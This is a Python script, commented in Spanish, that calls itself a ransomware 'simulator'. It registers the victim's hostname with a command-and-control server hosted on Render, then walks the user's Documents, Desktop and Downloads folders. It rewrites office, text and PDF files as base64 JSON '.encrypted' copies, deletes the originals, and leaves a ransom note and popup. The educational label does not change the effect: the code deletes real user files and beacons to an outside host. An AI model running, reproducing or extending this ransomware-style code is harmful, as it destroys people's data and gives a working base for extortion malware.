import os
import sys
import json
import base64
import requests
import socket
import time
from datetime import datetime
import win32gui
import win32con

# Agregar esto al inicio para debugging
print("=== DEBUG RANSOMWARE ===")
print(f"Python path: {sys.executable}")
print(f"Working dir: {os.getcwd()}")

class RansomwareSimulator:
    def __init__(self):
        self.encrypted_extension = ".encrypted"
        self.victim_id = socket.gethostname()
        self.recovery_key = None
        
        # ========== SOLO ESTA PARTE CAMBIÓ ==========
        # Lista de servidores a probar (local y Render)
        self.server_urls = [
            "https://server-control.onrender.com/",  # ← TU URL DE RENDER AQUÍ
            "http://192.168.56.1:5000",             # ← Local backup
            "http://localhost:5000"                 # ← Ultra backup
        ]
        # ============================================
        
        print(f"[INIT] Victim ID: {self.victim_id}")
        print(f"[INIT] Servers a probar: {self.server_urls}")
    
    def discover_server(self):
        """Descubrir automáticamente qué servidor está disponible"""
        print("🔍 Buscando servidor disponible...")
        
        for server_url in self.server_urls:
            try:
                print(f"   Probando: {server_url}")
                response = requests.get(f"{server_url}/health", timeout=5)
                if response.status_code == 200:
                    print(f"   ✅ Servidor encontrado: {server_url}")
                    return server_url
            except Exception as e:
                print(f"   ❌ {server_url} - {e}")
                continue
        
        print("❌ No se pudo conectar a ningún servidor")
        return None
    
    def communicate_with_c2(self):
        """Obtener la clave del servidor - CON MÚLTIPLES INTENTOS"""
        # Primero descubrir qué servidor está disponible
        server_url = self.discover_server()
        
        if not server_url:
            print("🚨 Todos los servidores están fuera de línea")
            self.recovery_key = "BACKUP_NO_SERVER"
            return False
        
        try:
            victim_data = {
                'victim_id': self.victim_id,
                'timestamp': datetime.now().isoformat(),
                'status': 'infected'
            }
            
            print(f"[C2] 🔗 Conectando a: {server_url}")
            print(f"[C2] 📦 Enviando datos: {victim_data}")
            
            # Timeout ajustado según el servidor
            timeout = 10 if "render.com" in server_url else 5
            
            response = requests.post(
                f"{server_url}/register_victim",
                json=victim_data,
                timeout=timeout
            )
            
            print(f"[C2] 📡 Respuesta del servidor: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                self.recovery_key = data.get('recovery_key')
                print(f"[C2] ✅ ÉXITO - Clave obtenida: {self.recovery_key}")
                print(f"[C2] 🌐 Servidor: {server_url}")
                return True
            else:
                print(f"[C2] ❌ Error HTTP: {response.status_code}")
                print(f"[C2] Respuesta: {response.text}")
                
        except requests.exceptions.ConnectTimeout:
            print(f"[C2] ❌ TIMEOUT - No se pudo conectar a {server_url}")
        except requests.exceptions.ConnectionError:
            print(f"[C2] ❌ CONNECTION ERROR - Servidor inaccesible: {server_url}")
        except Exception as e:
            print(f"[C2] ❌ ERROR GENERAL: {e}")
            import traceback
            traceback.print_exc()
        
        # Clave de respaldo
        self.recovery_key = "BACKUP_KEY_12345"
        print(f"[C2] 🛡️ Usando clave de respaldo: {self.recovery_key}")
        return False

    
    def simulate_file_encryption(self, file_path):
        """Usar la clave REAL del servidor"""
        try:
            if not any(file_path.lower().endswith(ext) for ext in ['.docx', '.doc', '.xlsx', '.xls', '.pptx', '.ppt', '.txt', '.pdf']):
                return False
            
            print(f"[ENCRYPTING] {file_path}")
            
            # Leer archivo original
            with open(file_path, 'rb') as f:
                original_data = f.read()
            
            # Crear datos cifrados con la clave REAL del servidor
            encrypted_data = {
                'original_data': base64.b64encode(original_data).decode('utf-8'),
                'original_path': file_path,
                'timestamp': datetime.now().isoformat(),
                'recovery_key': self.recovery_key,  # ← CLAVE DEL SERVIDOR
                'victim_id': self.victim_id,
                'file_size': len(original_data)
            }
            
            # Guardar archivo cifrado
            encrypted_path = file_path + self.encrypted_extension
            with open(encrypted_path, 'w', encoding='utf-8') as f:
                json.dump(encrypted_data, f, indent=2)
            
            # Eliminar original
            os.remove(file_path)
            
            print(f"✅ Cifrado simulado: {file_path}")
            return True
            
        except Exception as e:
            print(f"❌ Error cifrando {file_path}: {e}")
            return False
    
    def start_encryption_process(self):
        """Proceso principal - OBTENER CLAVE PRIMERO"""
        print("[RANSOMWARE] Iniciando simulación...")
        
        # PASO CRÍTICO: Obtener clave del servidor ANTES de cifrar
        print("[RANSOMWARE] Obteniendo clave del servidor...")
        if not self.communicate_with_c2():
            print("[RANSOMWARE] ⚠️ Usando clave de respaldo")
        
        print(f"[RANSOMWARE] Clave a usar: {self.recovery_key}")
        
        # Carpetas objetivo
        target_folders = [
            os.path.join(os.path.expanduser("~"), "Documents"),
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(os.path.expanduser("~"), "Downloads"),
        ]
        
        encrypted_count = 0
        
        for folder in target_folders:
            if os.path.exists(folder):
                print(f"[SCANNING] {folder}")
                
                for root, dirs, files in os.walk(folder):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if self.simulate_file_encryption(file_path):
                            encrypted_count += 1
        
        # Crear nota de rescate
        self.create_ransom_note()
        self.show_popup_warning()
        
        print(f"[RANSOMWARE] Simulación completada. Archivos: {encrypted_count}")
        return encrypted_count

    def create_ransom_note(self):
        """Nota de rescate con la clave REAL"""
        note_content = f"""
⚠️ ¡TODOS TUS ARCHIVOS HAN SIDO CIFRADOS! ⚠️

INFORMACIÓN PARA RECUPERACIÓN:
ID de Víctima: {self.victim_id}
Clave de Recuperación: {self.recovery_key}

Contacta al soporte técnico con esta información.

[ESTA ES UNA SIMULACIÓN EDUCATIVA]
"""
        
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        note_path = os.path.join(desktop_path, "INSTRUCCIONES_RECUPERACION.txt")
        
        with open(note_path, 'w', encoding='utf-8') as f:
            f.write(note_content)
        
        return note_path

    def show_popup_warning(self):
        """Mostrar popup de advertencia"""
        try:
            message = f"¡Tus archivos han sido cifrados!\n\nID: {self.victim_id}\nClave: {self.recovery_key}\n\nConsulta el archivo en el escritorio."
            win32gui.MessageBox(0, message, "⚠️ ALERTA - SIMULACIÓN", win32con.MB_ICONWARNING)
        except:
            pass

def main():
    ransomware = RansomwareSimulator()
    files_affected = ransomware.start_encryption_process()
    
    print(f"\n🎯 SIMULACIÓN COMPLETADA")
    print(f"📊 Archivos afectados: {files_affected}")
    print(f"🔑 Clave usada: {ransomware.recovery_key}")
    print(f"💻 ID Víctima: {ransomware.victim_id}")

if __name__ == "__main__":
    main()